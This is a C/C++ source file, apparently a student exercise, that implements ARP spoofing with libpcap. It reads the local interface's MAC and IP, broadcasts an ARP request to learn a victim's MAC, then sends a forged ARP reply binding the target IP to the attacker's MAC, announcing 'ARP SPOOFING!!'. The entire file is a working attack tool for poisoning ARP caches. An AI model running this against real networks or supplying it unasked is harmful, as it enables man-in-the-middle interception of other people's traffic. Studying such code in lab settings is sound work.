#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <netinet/ether.h>
#include <unistd.h>

#include "ethhdr.h"
#include "arphdr.h"

#include "arp_spoof.h"

struct ethernet_hdr
{
    u_int8_t  dhost[ETHER_ADDR_LEN];/* destination ethernet address */
    u_int8_t  shost[ETHER_ADDR_LEN];/* source ethernet address */
    u_int16_t type;                 /* protocol */
};

#define	ETHERTYPE_ARP		0x0806

EthArpPacket Arppacket;

uint8_t* getMymac(char* interface) {
    int sockfd;
    struct ifreq ifr;
    unsigned char *mac;
    static uint8_t macAddrString[6];

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, interface);

    int res = ioctl(sockfd, SIOCGIFHWADDR, &ifr);

    close(sockfd);

    if (res == 0) {
        mac = (unsigned char *) ifr.ifr_hwaddr.sa_data;
        for(int i =0; i<6; i++){
            macAddrString[i] = mac[i];
        }
        return macAddrString;
    } else {
        return 0;
    }
}

char* getMyip(char* interface){
    int n;
    struct ifreq ifr;

    n = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name , interface , IFNAMSIZ - 1);
    ioctl(n, SIOCGIFADDR, &ifr);
    close(n);

    return inet_ntoa(( (struct sockaddr_in *)&ifr.ifr_addr )->sin_addr);
}

void arp_spoof(uint8_t* My_mac,char * My_ip,char * Sender_ip,char* Target_ip,char* dev) {
    char errbuf[PCAP_ERRBUF_SIZE];
    unsigned char * sender_mac_address;
    uint8_t mac_address[6];

    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return;
    }
    Arppacket.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    Arppacket.eth_.smac_ = Mac(My_mac);
    Arppacket.eth_.type_ = htons(EthHdr::Arp);
    Arppacket.arp_.hrd_ = htons(ArpHdr::ETHER);
    Arppacket.arp_.pro_ = htons(EthHdr::Ip4);
    Arppacket.arp_.hln_ = Mac::SIZE;
    Arppacket.arp_.pln_ = Ip::SIZE;
    Arppacket.arp_.op_ = htons(ArpHdr::Request);
    Arppacket.arp_.smac_ = Mac(My_mac);
    Arppacket.arp_.sip_ = htonl(Ip(My_ip));
    Arppacket.arp_.tmac_ = Mac("00:00:00:00:00:00");
    Arppacket.arp_.tip_ = htonl(Ip(Sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Arppacket), sizeof(EthArpPacket));


    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        struct ethernet_hdr *eth_hdr = (struct ethernet_hdr*)packet;

        if(ntohs(eth_hdr->type) != ETHERTYPE_ARP) continue;
        sender_mac_address = (unsigned char *)(packet + sizeof(struct ethernet_hdr) + 8);
        // packet_base + ethernet_hdr + H/W Type(2byte) + Protocol Type(2byte) + HW len(1byte) + prot len(1byte) + Operation(2byte)

        for(int i =0; i<6; i++){
            mac_address[i] = sender_mac_address[i];
        }

        printf("Sender's Mac Address => ");
        for(int i =0; i<6;i++)
            printf("[%02x] ",sender_mac_address[i]);
        printf("\n");

        break;

    }

    Arppacket.eth_.dmac_ = Mac(mac_address);
    Arppacket.arp_.tmac_ = Mac(mac_address);
    Arppacket.arp_.op_ = htons(ArpHdr::Reply);
    Arppacket.arp_.sip_ = htonl(Ip(Target_ip));

    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Arppacket), sizeof(EthArpPacket));


    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }

    printf("ARP SPOOFING!!\n");

    pcap_close(handle);
}
